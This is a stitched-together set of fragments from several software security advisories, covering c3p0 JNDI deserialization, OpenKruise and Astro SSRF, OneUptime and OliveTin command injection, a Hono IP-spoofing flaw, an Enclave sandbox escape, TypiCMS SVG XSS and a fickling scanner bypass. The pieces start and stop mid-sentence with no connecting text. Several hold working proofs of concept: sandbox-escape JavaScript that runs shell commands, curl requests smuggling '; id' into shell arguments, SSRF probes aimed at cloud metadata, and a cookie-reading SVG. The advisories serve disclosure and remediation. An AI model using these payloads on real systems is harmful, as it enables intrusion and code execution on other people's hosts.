vulnerabilities in mchange-commons-java, use of Java-serialized-object hex as the format for a writable Java-Bean property, of objects that may be exposed across JNDI interfaces, represents a serious independent fragility.\n\n### Patches\n\nThe `userOverridesAsString` property of c3p0 `ConnectionPoolDataSource` classes has been reimplemented to use a safe CSV-based format, rather than rely upon potentially dangerous Java object deserialization.\n\nc3p0-0.12.0+ and above depend upon mchange-commons-java 0.4.0+, which gates support for remote `factoryClassLocation` values by configuration parameters that default to restrictive values. Those parameters are documented [here](https://www.mchange.com/projects/c3p0/#configuring_security).\n\nc3p0 additionally enforces the new mchange-commons-java `com.mchange.v2.naming.nameGuardClassName` to prevent injection of unexpected, potentially remote JNDI names.\n\n### Workarounds\n\nUsers should upgrade to c3p0-0.12.0 or above. There is no supported workaround for earlier versions of c3p0.\n\n### References\n\n[c3p0, you little rascal &mdash; Hans-Martin Münch](https://mogwailabs.de/en/blog/2025/02/c3p0-you-little-rascal/)\n[c3p0 documentation, security note](https://www.mchange.com/projects/c3p0/#security-note)\n[c3p0 documentation, configuring security](https://www.mchange.com/projects/c3p0/#configuring_security)",

The webhook validation does not restrict the Host field in these probe configurations. Since kruise-daemon runs with hostNetwork=true, it executes probes from the node network namespace. An attacker with PodProbeMarker creation permission can specify arbitrary Host values (127.0.0.1, 169.254.169.254, internal IPs) to trigger SSRF from the node, perform port scanning, and receive response feedback through NodePodProbe status messages.\n\n## Kubernetes Version\n\n- Kubernetes: v1.30.0 (kind cluster)\n- Distribution: kind\n\n## Component Version\n\n- OpenKruise: v1.8.0\n- kruise-daemon: DaemonSet with hostNetwork=true\n- Affected CRDs: PodProbeMarker, NodePodProbe\n\n## Steps To Reproduce\n\n### Environment Setup\n\n1. Install OpenKruise v1.8.0 in kind cluster:\n```bash\nhelm repo add openkruise https://openkruise.github.io/charts/\nhelm install kruise openkruise/kruise --version 1.8.0 \\\n  --namespace kruise-system --create-namespace\n```\n\n2. Verify kruise-daemon runs with hostNetwork:\n```bash\nkubectl -n kruise-system get ds kruise-daemon -o yaml | grep hostNetwork\n```\nOutput:\n```\nhostNetwork: true\n```\n\n3. Create test namespace and RBAC:\n```bash\nkubectl apply -f - <<EOF\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: tenant-a\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: attacker\n  namespace: tenant-a\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: ppm-creator\n  namespace: tenant-a\nrules:\n- apiGroups: [\"apps.kruise.io\"]\n  resources: [\"podprobemarkers\"]\n  verbs: [\"create\",\"get\",\"list\",\"watch\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: ppm-creator-binding\n  namespace: tenant-a\nsubjects:\n- kind: ServiceAccount\n  name: attacker\n  namespace: tenant-a\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: Role\n  name: ppm-creator\nEOF\n```\n\n4. Deploy victim workload:\n```bash\nkubectl apply -f - <<EOF\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: victim\n  namespace: tenant-a\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: victim\n  template:\n    metadata:\n      labels:\n        app: victim\n    spec:\n      containers:\n      - name: victim\n        image: busybox:1.36\n        command: [\"/bin/sh\",\"-c\",\"sleep 36000\"]\nEOF\n```\n\n### Exploitation Steps\n\n5. Verify node-local port accessibility (kubelet healthz):\n```bash\nNODE_CONTAINER=$(docker ps --format '{{.Names}}' | grep control-plane)\ndocker exec $NODE_CONTAINER curl -s -o /dev/null -w \"%{http_code}\" http://127.0.0.1:10248/healthz\n```\nOutput:\n```\n200\n```\n\n6. Create SSRF PodProbeMarker targeting node-local port (as attacker):\n```bash\nkubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - <<EOF\napiVersion: apps.kruise.io/v1alpha1\nkind: PodProbeMarker\nmetadata:\n  name: ppm-tcp-ssrf\n  namespace: tenant-a\nspec:\n  selector:\n    matchLabels:\n      app: victim\n  probes:\n  - name: tcp-ssrf\n    containerName: victim\n    podConditionType: ssrf.kruise.io/tcp\n    probe:\n      tcpSocket:\n        host: 127.0.0.1\n        port: 10248\n      timeoutSeconds: 2\n      periodSeconds: 5\nEOF\n```\nOutput:\n```\npodprobemarker.apps.kruise.io/ppm-tcp-ssrf created\n```\n\n7. Wait for probe execution and observe SSRF result:\n```bash\nsleep 10\nNODE_NAME=$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}')\nkubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 20 \"ppm-tcp-ssrf\"\n```\nOutput:\n```yaml\n      name: ppm-tcp-ssrf#tcp-ssrf\n      probe:\n        tcpSocket:\n          host: 127.0.0.1\n          port: 10248\nstatus:\n  podProbeStatuses:\n  - name: victim-8596ff64d6-jklnb\n    namespace: tenant-a\n    probeStates:\n    - lastProbeTime: \"2026-01-13T17:48:10Z\"\n      name: ppm-tcp-ssrf#tcp-ssrf\n      state: Succeeded\n```\n\nEvidence: Probe succeeded, confirming kruise-daemon accessed node-local port 127.0.0.1:10248 from node network namespace.\n\n8. Demonstrate port scanning capability (closed port):\n```bash\nkubectl -n tenant-a apply --as system:serviceaccount:tenant-a:attacker -f - <<EOF\napiVersion: apps.kruise.io/v1alpha1\nkind: PodProbeMarker\nmetadata:\n  name: ppm-tcp-closed\n  namespace: tenant-a\nspec:\n  selector:\n    matchLabels:\n      app: victim\n  probes:\n  - name: tcp-closed\n    containerName: victim\n    podConditionType: ssrf.kruise.io/tcp-closed\n    probe:\n      tcpSocket:\n        host: 127.0.0.1\n        port: 9999\n      timeoutSeconds: 2\n      periodSeconds: 5\nEOF\n```\n\n9. Observe port scanning result:\n```bash\nkubectl get nodepodprobe $NODE_NAME -o yaml | grep -A 5 \"ppm-tcp-closed\"\n```\nOutput:\n```yaml\n    - lastProbeTime: \"2026-01-13T17:51:08Z\"\n      message: 'dial tcp 127.0.0.1:9999: connect: connection refused'\n      name: ppm-tcp-closed#tcp-closed\n      state: Failed\n```\n\nEvidence: Failed probe with \"connection refused\" message enables port state differentiation for scanning.\n\n10. Verify Pod condition and events:\n```bash\nVICTIM_POD=$(kubectl -n tenant-a get pod -l app=victim -o jsonpath='{.items[0].metadata.name}')\nkubectl -n tenant-a describe pod $VICTIM_POD | grep -A 10 \"Conditions:\"\n```\nOutput:\n```\nConditions:\n  Type                        Status\n  ssrf.kruise.io/tcp          True\n  ssrf.kruise.io/tcp-closed   False\n\nEvents:\n  Normal  KruiseProbeSucceeded  96s (x24 over 3m26s)  kruise-daemon-podprobe\n```\n\n### Source Code Evidence\n\n11. TCPSocket Host field used without restriction:\n\nFile: `pkg/daemon/podprobe/prober.go`\n```go\nfunc (pb *prober) newTCPSocketProber(tcp *v1.TCPSocketAction, podIP string) tcpProber {\n    host := tcp.Host\n    if host == \"\" {\n        host = podIP\n    }\n    return tcpProber{\n        tcp: tcp,\n        host: host,\n    }\n}\n```\n\n12. Webhook validation does not check Host field:\n\nFile: `pkg/webhook/podprobemarker/validating/probe_create_update_handler.go`\n```go\nfunc validateTCPSocketAction(tcp *corev1.TCPSocketAction, fldPath *field.Path) field.ErrorList {\n    return ValidatePortNumOrName(tcp.Port, fldPath.Child(\"port\"))\n}\n```\n\nNote: Only port validation, no Host restriction.\n\n### Attack Scenarios\n\nScenario 1 - Cloud metadata access:\n```yaml\nprobe:\n  tcpSocket:\n    host: 169.254.169.254\n    port: 80\n```\n\nScenario 2 - Internal service discovery:\n```yaml\nprobe:\n  tcpSocket:\n    host: 10.0.0.1\n    port: 6379\n```\n\nScenario 3 - Node-local kubelet API:\n```yaml\nprobe:\n  tcpSocket:\n    host: 127.0.0.1\n    port: 10250\n```\n\n## Supporting Material/References\n\n### Verification Evidence\n\n1. kruise-daemon hostNetwork configuration:\n```bash\n$ kubectl -n kruise-system get ds kruise-daemon -o yaml | grep -A 2 \"hostNetwork\"\n      hostNetwork: true\n      restartPolicy: Always\n```\n\n2. Successful SSRF to open port (127.0.0.1:10248):\n```yaml\nstatus:\n  podProbeStatuses:\n    probeStates:\n    - name: ppm-tcp-ssrf#tcp-ssrf\n      state: Succeeded\n```\n\n3. Port scanning result for closed port (127.0.0.1:9999):\n```yaml\nstatus:\n  podProbeStatuses:\n    probeStates:\n    - message: 'dial tcp 127.0.0.1:9999: connect: connection refused'\n      name: ppm-tcp-closed#tcp-closed\n      state: Failed\n```\n\n4. Pod condition reflecting probe results:\n```\nConditions:\n  Type                        Status\n  ssrf.kruise.io/tcp          True\n  ssrf.kruise.io/tcp-closed   False\n```\n\n### Impact Assessment\n\n- Confidentiality: Medium-High. Access to node-local services, cloud metadata, internal network resources.\n- Integrity: Low. Primarily information disclosure.\n- Availability: Medium. Resource consumption from probe requests.\n\n### Limitations\n\nHTTPGet probe rejected by webhook in OpenKruise v1.8.0:\n```\nError: admission webhook denied the request: spec.probe.probe: Forbidden: current no support http probe\n```\n\nTCPSocket probe remains vulnerable.\n\n### Remediation\n\nTemporary mitigation:\n- Restrict PodProbeMarker creation permissions\n- Apply network policies limiting kruise-daemon egress\n- Audit existing PodProbeMarker resources\n\nPermanent fix:\n- Enforce Host field restrictions in webhook validation\n- Deny private IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16)\n- Require Host to be empty or equal to PodIP\n- Sanitize error messages in NodePodProbe status\n\n---\n\n**Verification Environment**: kind v1.30.0 + OpenKruise v1.8.0",

If an attacker can provoke an application to read a maliciously crafted `jaxax.naming.Reference` or serialized object, they can provoke the download and execution of malicious code.\n\nImplementations of this functionality within the JDK were disabled by default behind a System property that defaults to `false`, `com.sun.jndi.ldap.object.trustURLCodebase`. However, since mchange-commons-java includes an independent implementation of JNDI derefencing, libraries (such as c3p0) that resolve references via that implementation could be provoked to download and execute malicious code even after the JDK was hardened.\n\n### Patches\nMirroring the JDK patch, mchange-commons-java's JNDI functionality is now gated by configuration parameters that default to restrictive values. Those parameters are documented [here](https://www.mchange.com/projects/c3p0/#configuring_security).\n\n### Workarounds\nNo. Users should upgrade to mchange-commons-java >= 0.4.0.

Remote image fetches are intended to be restricted to domains the site developer has manually authorized (using the `image.domains` or `image.remotePatterns` options).\n\nHowever, when `inferSize` is used, no domain validation is performed — the image is fetched from any host regardless of the configured restrictions. An attacker who can influence the image URL (e.g., via CMS content or user-supplied data) can cause the server to fetch from arbitrary hosts.\n\n## PoC\n\n<details>\n\n### Setup\n\nCreate a new Astro project with the following files:\n\n`package.json`:\n```json\n{\n  \"name\": \"poc-ssrf-infersize\",\n  \"private\": true,\n  \"scripts\": {\n    \"dev\": \"astro dev --port 4322\",\n    \"build\": \"astro build\"\n  },\n  \"dependencies\": {\n    \"astro\": \"5.17.2\",\n    \"@astrojs/node\": \"9.5.3\"\n  }\n}\n```\n\n`astro.config.mjs` — only `localhost:9000` is authorized:\n```javascript\nimport { defineConfig } from 'astro/config';\nimport node from '@astrojs/node';\n\nexport default defineConfig({\n  output: 'server',\n  adapter: node({ mode: 'standalone' }),\n  image: {\n    remotePatterns: [\n      { hostname: 'localhost', port: '9000' }\n    ]\n  }\n});\n```\n\n`internal-service.mjs` — simulates an internal service on a non-allowlisted host (`127.0.0.1:8888`):\n```javascript\nimport { createServer } from 'node:http';\nconst GIF = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');\ncreateServer((req, res) => {\n  console.log(`[INTERNAL] Received: ${req.method} ${req.url}`);\n  res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': GIF.length });\n  res.end(GIF);\n}).listen(8888, '127.0.0.1', () => console.log('Internal service on 127.0.0.1:8888'));\n```\n\n`src/pages/test.astro`:\n```astro\n---\nimport { getImage } from 'astro:assets';\n\nconst result = await getImage({\n  src: 'http://127.0.0.1:8888/internal-api',\n  inferSize: true,\n  alt: 'test'\n});\n---\n<html><body>\n  <p>Width: {result.options.width}, Height: {result.options.height}</p>\n</body></html>\n```\n\n### Steps to reproduce\n\n1. Run `npm install` and start the internal service:\n\n```bash\nnode internal-service.mjs\n```\n\n2. Start the dev server:\n\n```bash\nnpm run dev\n```\n\n3. Request the page:\n\n```bash\ncurl http://localhost:4322/test\n```\n\n4. `internal-service.mjs` logs `Received: GET /internal-api` — the request was sent to `127.0.0.1:8888` despite only `localhost:9000` being in the allowlist.\n\n</details>\n\n## Impact\n\nAllows bypassing `image.domains` / `image.remotePatterns` restrictions to make server-side requests to unauthorized hosts. This includes the risk of server-side request forgery (SSRF) against internal network services and cloud metadata endpoints.",

When a raw `string` is passed (line 47: `hostAddress = destination`), no validation or sanitization is performed before it reaches `performTraceroute()`.\n\n`child_process.exec()` spawns a shell (`/bin/sh`), so any shell metacharacters (`;`, `|`, `$()`, `` ` ` ``, `&&`, `||`, `\\n`) in `destination` will be interpreted, allowing full command injection.\n\n## PoC\n\n\n1. poc.cjs\n```javascript\n/**\n * PoC: OS Command Injection in OneUptime NetworkPathMonitor\n *\n * Replicates the exact vulnerable code path from\n * Probe/Utils/Monitors/MonitorTypes/NetworkPathMonitor.ts:149-191\n */\n\nconst { exec } = require(\"child_process\");\nconst { promisify } = require(\"util\");\nconst execAsync = promisify(exec);\n\nasync function performTraceroute_VULNERABLE(destination, maxHops, timeout) {\n    const isMac = process.platform === \"darwin\";\n    const isWindows = process.platform === \"win32\";\n\n    let command;\n    if (isWindows) {\n        command = `tracert -h ${maxHops} -w ${Math.ceil(timeout / 1000) * 1000} ${destination}`;\n    } else if (isMac) {\n        command = `traceroute -m ${maxHops} -w 3 ${destination}`;\n    } else {\n        command = `traceroute -m ${maxHops} -w 3 ${destination}`;\n    }\n\n    console.log(`[VULN] Constructed command: ${command}`);\n\n    try {\n        const { stdout, stderr } = await execAsync(command);\n        return { stdout, stderr };\n    } catch (err) {\n        return { stdout: err.stdout || \"\", stderr: err.stderr || err.message };\n    }\n}\n\nasync function runPoC() {\n    console.log(\"=== Payload 1: Semicolon chaining (;) ===\");\n    console.log(\"  destination = '127.0.0.1; id'\\n\");\n    const r1 = await performTraceroute_VULNERABLE(\"127.0.0.1; id\", 1, 5000);\n    console.log(\"[stdout]:\", r1.stdout);\n\n    console.log(\"\\n=== Payload 2: Pipe injection (|) ===\");\n    console.log(\"  destination = '127.0.0.1 | whoami'\\n\");\n    const r2 = await performTraceroute_VULNERABLE(\"127.0.0.1 | whoami\", 1, 5000);\n    console.log(\"[stdout]:\", r2.stdout);\n\n    console.log(\"\\n=== Payload 3: Subshell execution $() ===\");\n    console.log(\"  destination = '127.0.0.1$(echo INJECTED)'\\n\");\n    const r3 = await performTraceroute_VULNERABLE(\"127.0.0.1$(echo INJECTED)\", 1, 5000);\n    console.log(\"[stderr]:\", r3.stderr);\n}\n\nrunPoC().catch(console.error);\n```\n\n2. Run the PoC:\n\n```bash\nnode poc.cjs\n```\n\n3. **Expected output** (confirmed on macOS with Node.js v25.2.1):\n\n```\n=== Payload 1: Semicolon chaining (;) ===\n  destination = '127.0.0.1; id'\n\n[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1; id\n[stdout]:  1  localhost (127.0.0.1)  0.215 ms  0.076 ms  0.055 ms\nuid=501(dxleryt) gid=20(staff) groups=20(staff),12(everyone)...\n\n=== Payload 2: Pipe injection (|) ===\n  destination = '127.0.0.1 | whoami'\n\n[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1 | whoami\n[stdout]: dxleryt\n\n=== Payload 3: Subshell execution $() ===\n  destination = '127.0.0.1$(echo INJECTED)'\n\n[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1$(echo INJECTED)\n[stderr]: traceroute: unknown host 127.0.0.1INJECTED\n```\n\nThe `id` and `whoami` commands execute successfully, proving arbitrary command execution. The subshell payload proves inline shell evaluation — `$(echo INJECTED)` is evaluated and appended to the hostname.\n\n## Impact\n\n**Vulnerability type:** OS Command Injection (CWE-78)\n\n**Who is impacted:** Any authenticated user with the ability to create or edit a network path monitor in a OneUptime project can execute arbitrary operating system commands on the Probe server(s). In a multi-tenant SaaS deployment, this allows a malicious tenant to:\n\n- **Execute arbitrary commands** as the Probe service user (Remote Code Execution)\n- **Read sensitive files** from the Probe server (e.g., environment variables, credentials, service account tokens)\n- **Pivot to internal services** accessible from the Probe's network position\n- **Compromise other tenants' monitoring data** if Probes are shared across tenants\n- **Establish persistent backdoors** (reverse shells, cron jobs, SSH keys)\n\n> **Note:** The `NetworkPathMonitor` class is fully implemented and exported but not yet wired into the monitor execution pipeline (no callers import it). The vulnerability will become exploitable once this monitor type is integrated. The code is present in the current codebase and ready to be activated.",

However, the previous implementation of `getConnInfo()` extracted the leftmost IP address:\n\n```ts\naddress = xff.split(',')[0].trim()\n```\n\nIf a client sent:\n\n```\nX-Forwarded-For: <spoofed-ip>\n```\n\nALB would forward:\n\n```\nX-Forwarded-For: <spoofed-ip>, <real-client-ip>\n```\n\nSince the implementation selected the first value, the spoofed IP address was trusted. This affected applications using:\n\n```ts\nipRestriction(getConnInfo, { allowList: [...] })\n```\n\nor any custom middleware relying on `getConnInfo(c).remote.address` for authorization decisions.\n\nThe issue only affects deployments using the AWS Lambda adapter behind an ALB. API Gateway (v1/v2) and Lambda Function URLs are not affected, as they use AWS-provided source IP values from `requestContext`.\n\n## Impact\n\nAn unauthenticated remote attacker could bypass IP-based access restrictions by supplying a crafted `X-Forwarded-For` header. This may allow access to resources that were intended to be restricted by IP address.\n\nOnly applications deployed behind an ALB and relying on `getConnInfo()` for IP-based authorization are affected.",

This can be used to get retrieve property descriptors via `Object.getOwnPropertyDescriptors`, allowing access to properties otherwise restricted by the sandbox.\n\nWhen a memory limit is set (which is the default), `__host_memory_track__`, a host object, can be used to escape via the host function constructor.\n\nWhen this is not the case, a host reference can be obtained via Node's `nodejs.util.inspect.custom` symbol (which can be triggered, for example, through `console.log`).\n\n---\n\n## Proof of Concept\n\n### PoC 1\n\n```js\nconst { Enclave } = require(\"@enclave-vm/core\");\n\nconst enclave = new Enclave({\n  securityLevel: \"SECURE\",\n  toolHandler: () => {},\n});\n\nconst result = enclave.run(`\nconst op = {}[[\"__proto__\"]];\nconst ho = op[[\"constructor\"]];\n\nconst glob = ho.getOwnPropertyDescriptors(this);\n\nreturn {\n  res: glob.__host_memory_track__.value[[\"constructor\"]](\"return process\")()\n    .getBuiltinModule(\"child_process\")\n    .execSync(\"id\")\n    .toString()\n    .split(\"\\\\n\"),\n};`);\n\nresult\n  .then((v) => console.log(\"success\", v))\n  .catch((e) => console.log(\"failure\", e));\n```\n\n---\n\n### PoC 2\n\n```js\nconst { Enclave } = require(\"@enclave-vm/core\");\n\nconst enclave = new Enclave({\n  securityLevel: \"STRICT\",\n  toolHandler: () => {},\n  memoryLimit: 0,\n});\n\nconst result = enclave.run(`\nconst op = {}[['__proto__']];\nconst ho = op[['constructor']];\n\nconst glob = ho.getOwnPropertyDescriptors(this);\n\nconst sym = glob[['Symbol']].value.for('nodejs.util.inspect.custom');\n\nlet result;\nconst obj = {\n  [sym]: (depth, option, inspect) => {\n    result = inspect[['constructor']]\n      [['constructor']]('return process')()\n      .getBuiltinModule('child_process')\n      .execSync('id')\n      .toString();\n  },\n};\n\nglob.__safe_console.value.log(obj);\nreturn { result }\n`);\n\nresult\n  .then((v) => console.log(\"success\", v))\n  .catch((e) => console.log(\"failure\", e));\n```\n\n---\n\n## Impact\n\nThis vulnerability allows a malicious actor executing untrusted code inside an Enclave instance to escape the sandbox and execute arbitrary commands on the host system.\n\nThis constitutes **Remote Code Execution (RCE)** and should be considered **Critical severity**.\n\n---\n\n## Remediation\n\nThe issue has been fixed in **v2.11.0** with the following hardening measures:\n\n* Strengthened intrinsic object isolation\n* Improved console isolation\n* Hardened host callback exposure paths\n* Closed AST validation gaps\n* Added additional defensive checks around constructor access and prototype traversal\n\nAll known escape paths demonstrated in the PoCs are now blocked.\n\nUsers are strongly advised to upgrade to **v2.11.1** or later immediately.\n\n---\n\n## Credit\n\nEnclave would like to thank **@c0rydoras** for responsibly reporting this issue and for providing detailed proof-of-concept examples.",

A user supplying a `password`-typed argument can inject shell metacharacters that execute arbitrary OS commands. A second independent vector allows unauthenticated RCE via webhook-extracted JSON values that skip type safety checks entirely before reaching `sh -c`.\n\n### Details\n\n**Vector 1 — `password` type bypasses shell safety check (PR:L)**\n\n`service/internal/executor/arguments.go` has two gaps:\n\n```go\n// Line 198-199 — TypeSafetyCheck returns nil (no error) for password type\ncase \"password\":\n    return nil  // accepts ANY string including ; | ` $()\n\n// Line 313 — checkShellArgumentSafety blocks dangerous types but not password\nunsafe := map[string]bool{\n    \"url\":                      true,\n    \"email\":                    true,\n    \"raw_string_multiline\":     true,\n    \"very_dangerous_raw_string\": true,\n    // \"password\" is absent — not blocked\n}\n```\n\nShell execution at `service/internal/executor/executor_unix.go:18`:\n```go\nexec.CommandContext(ctx, \"sh\", \"-c\", finalParsedCommand)\n```\n\nA user supplies a `password` argument value of `'; id; echo '` → `sh -c` interprets the shell metacharacters → arbitrary command execution.\n\nThis is not the \"admin already has access\" pattern: OliveTin explicitly enforces an admin/user boundary where admins define commands and users only supply argument values. The `password` type is the documented, intended mechanism for user-supplied sensitive values. The safety check exists precisely to prevent users from escaping this boundary — `password` is the one type it fails to block.\n\n**Vector 2 — Webhook JSON extraction skips TypeSafetyCheck entirely (PR:N)**\n\n`service/internal/executor/handler.go:153-157` extracts arbitrary key-value pairs from webhook JSON payloads and injects them into `ExecutionRequest.Arguments`. These webhook-extracted arguments have no corresponding config-defined `ActionArgument` entry, so `parseActionArguments()` in `arguments.go` finds no type to check against and skips `TypeSafetyCheck` entirely. The values are templated directly into the shell command and passed to `sh -c`.\n\nExample: an admin command template `git pull && echo {{ git_message }}` with Shell mode enabled. A webhook POST with `{\"git_message\": \"x; id\"}` injects `id` into the shell command. The webhook endpoint is unauthenticated by default (`authType: none` in default config).\n\n### PoC\n\n```bash\n# Vector 1 — authenticated user with password-type argument\ncurl -X POST http://localhost:1337/api/StartAction \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"actionId\": \"run-command\", \"arguments\": [{\"name\": \"pass\", \"value\": \"'; id; echo '\"}]}'\n\n# Vector 2 — unauthenticated webhook\ncurl -X POST http://localhost:1337/webhook/git-deploy \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"git_message\": \"x; id #\", \"git_author\": \"attacker\"}'\n```\n\nConfirmed on `jamesread/olivetin:latest` (3000.10.0), 3/3 runs. Both vectors produced `uid=1000(olivetin)` output and arbitrary file write to `/tmp/pwned`.\n\n### Impact\n\n- **Vector 1**: Any authenticated user (registration enabled by default, `authType: none` by default) can execute arbitrary OS commands on the OliveTin host with the permissions of the OliveTin process.\n- **Vector 2**: Unauthenticated attacker can achieve the same if the instance receives webhooks from external sources, which is a primary OliveTin use case.\n\nCombined: unauthenticated RCE on any OliveTin instance using Shell mode with webhook-triggered actions.",

          "html": "#### I. Summary\n\nA Stored Cross-Site Scripting (XSS) vulnerability exists in the file upload module of TypiCMS. The application allows users with file upload permissions to upload SVG files. While there is a MIME type validation, the content of the SVG file is not sanitized. An attacker can upload a specially crafted SVG file containing malicious JavaScript code. When another user (such as an administrator) views or accesses this file through the application, the script executes in their browser, leading to a compromise of that user's session.\n\nThe issue is exacerbated by a bug in the SVG parsing logic, which can cause a 500 error if the uploaded SVG does not contain a `viewBox` attribute. However, this does not mitigate the XSS vulnerability, as an attacker can easily include a valid `viewBox` attribute in their malicious payload.\n\n#### II. Vulnerability Details\n\n*   **Vulnerability Type:** Stored Cross-Site Scripting (XSS) (CWE-79)\n*   **Affected Component:** `TypiCMS\\Modules\\Core\\Http\\Requests\\FileFormRequest.php` and `TypiCMS\\Modules\\Core\\Services\\FileUploader.php`.\n*  **Affected Versions:** <= 16.0.5\n\nThe vulnerability stems from two main points:\n\n1.  **Permissive File Validation:** The `FileFormRequest` explicitly whitelists `svg` as an allowed MIME type for uploads.\n2.  **Lack of Content Sanitization:** The `FileUploader` service saves the SVG file to the server without parsing and sanitizing its content to remove potentially malicious elements like `<script>` tags or `on*` event handlers.\n\nWhen the default filesystem disk is set to `public`, the uploaded SVG file is stored in a publicly accessible directory, making it trivial to access the file via a direct URL and trigger the XSS payload.\n\n#### III. Proof of Concept (PoC)\n\n1.  **Create a Malicious SVG File:**\n    Create a file named `malicious.svg` with the following content. The `viewBox` attribute is included to bypass the application's parsing bug.\n\n    ```xml\n    <svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\">\n        <script>\n            // A simple PoC to demonstrate the vulnerability\n            alert('XSS in TypiCMS! Your session cookie is: ' + document.cookie);\n        </script>\n        <text x=\"10\" y=\"50\">If you see this, the script has run.</text>\n    </svg>\n    ```\n\n2.  **Upload the Malicious File:**\n    *   Log in to the TypiCMS admin panel as a user with permissions to upload files.\n    *   Navigate to the \"Files\" module (e.g., `/admin/files`).\n    *   Upload the `malicious.svg` file. The application will accept the file and store it.\n<img width=\"2540\" height=\"1217\" alt=\"image\" src=\"https://github.com/user-attachments/assets/beb8ace9-ac39-442c-a2bc-3fbfb09f8c32\" />\n<img width=\"1718\" height=\"671\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9cd4a3f8-28e3-4223-8203-7ab292eaf95f\" />\n\n3.  **Trigger the XSS:**\n    *   The application will provide a public URL for the uploaded file, typically in the format `http://<your-site>/storage/files/malicious.svg`.\n    *   Anyone who navigates to this URL will have the embedded JavaScript executed in their browser.\n    *   An attacker can send this link to a privileged user (e.g., an administrator). When the administrator clicks the link, their session cookies can be stolen, or the attacker can perform actions on their behalf.\n    \n<img width=\"2091\" height=\"704\" alt=\"image\" src=\"https://github.com/user-attachments/assets/99c915bb-a518-46aa-b237-390cd58f34e7\" />\n<img width=\"1457\" height=\"996\" alt=\"image\" src=\"https://github.com/user-attachments/assets/0ed000ec-78cf-4ed8-8cd5-2886fbb2afc0\" />\n\n\n#### IV. Impact\n\nSuccessful exploitation of this vulnerability allows an attacker to execute arbitrary JavaScript in the context of the victim's browser. Although the use of the `HttpOnly` flag on session cookies prevents direct theft of the session ID via `document.cookie`, the attacker can still achieve a full compromise of the victim's account by performing actions on their behalf.\n\nThe impact includes:\n\n*   **Account Takeover via Action Forgery:** The attacker's script can make authenticated requests to the application's API from the victim's browser. This allows the attacker to perform any action the victim is authorized to do, such as:\n    *   Creating a new administrator account for the attacker.\n    *   Changing the victim's email address and password.\n    *   Deleting or modifying all content, users, and settings.\n\n*   **Sensitive Information Disclosure:** The script can read the content of any page the victim views within the admin panel. This includes lists of users (with names and emails), private application settings, and other sensitive data, which can then be exfiltrated to an attacker-controlled server.\n\n*   **Phishing and Social Engineering:** The script can manipulate the admin panel's UI to display fake login forms to trick the user into re-entering their credentials, or redirect them to a malicious website.\n\n*   **Keystroke Logging:** The script can capture any information the victim types into forms on the compromised page.\n\nBecause the attacker can perform any action as an authenticated administrator, this vulnerability effectively leads to a **full application compromise**, even without direct access to the session cookie. The risk is **High**.\n\n\n#### V. Recommended Patches and Mitigations\n\nIt is recommended to apply a defense-in-depth approach to mitigate this vulnerability.\n\n1.  **Primary Fix: Sanitize SVG Content:**\n    The most robust solution is to sanitize SVG files upon upload. Before saving the file, it should be parsed to remove all potentially dangerous elements, including `<script>`, `<style>`, `<foreignObject>` tags, and all `on*` event attributes. This can be achieved using a dedicated SVG sanitization library.\n\n2.  **Secondary Fix: Disable SVG Uploads:**\n    If SVG uploads are not a critical feature for the application, the simplest and most secure solution is to disable them entirely. This can be done by removing `'svg'` from the list of allowed MIME types in `TypiCMS\\Modules\\Core\\Http\\Requests\\FileFormRequest.php`.\n\n    ```php\n    // In FileFormRequest.php\n    // BEFORE:\n    $fileRule = 'mimes:jpeg,gif,png,...,svg,...|max:...';\n\n    // AFTER:\n    $fileRule = 'mimes:jpeg,gif,png,...,pdf,...|max:...'; // Removed 'svg'\n    ```\n\n3.  **Hardening - Content-Security-Policy (CSP):**\n    Implement a strict Content-Security-Policy (CSP) header for the application. A well-configured CSP can prevent the execution of inline scripts, which would mitigate the impact of this XSS vulnerability.\n\n4.  **Hardening - Serve User Content from a Separate Domain:**\n    Serve all user-uploaded files from a separate, cookie-less domain. This is a highly effective security measure that isolates user-generated content from the main application, preventing scripts from accessing session cookies or interacting with the application's DOM.",

As an authenticated user, create a share for a file, with a password specified in \"Optional password\" (make sure to allow anonymous access as the PoC doesn't explain how to do this on a share that requires login, but it is also possible to do on a share that requires login, with some small tweaks to the API request)\n2.

The few potentially unsafe modules have been added to the blocklist (https://github.com/trailofbits/fickling/commit/0c4558d950daf70e134090573450ddcedaf10400).\n\n# Original report\n\n### Summary\nAll 5 of fickling's safety interfaces — `is_likely_safe()`, `check_safety()`, CLI `--check-safety`, `always_check_safety()`, and the `check_safety()` context manager — report `LIKELY_SAFE` / raise no exceptions for pickle files that call dangerous top-level stdlib functions (signal handlers, network servers, network connections, file operations) when the REDUCE opcode is followed by a BUILD opcode. Demonstrated impacts include backdoor network listeners (`socketserver.TCPServer`), process persistence (`signal.signal`), outbound data exfiltration (`smtplib.SMTP`), and file creation on disk (`sqlite3.connect`). An attacker can append a trivial BUILD opcode to any payload to eliminate all detection.\n\n## Details\n\nThe bypass exploits three weaknesses in fickling's static analysis pipeline:\n\n1. **`likely_safe_imports` over-inclusion** (`fickle.py:432-435`): When fickling decompiles a pickle and encounters `from smtplib import SMTP`, it adds `\"SMTP\"` to the `likely_safe_imports` set because `smtplib` is a Python stdlib module. This happens for ALL stdlib modules, including dangerous ones like smtplib, ftplib, sqlite3, etc.\n\n2. **`OvertlyBadEvals` exemption** (`analysis.py:301-310`): The main call-level safety checker skips any call where the function name is in `likely_safe_imports`. So 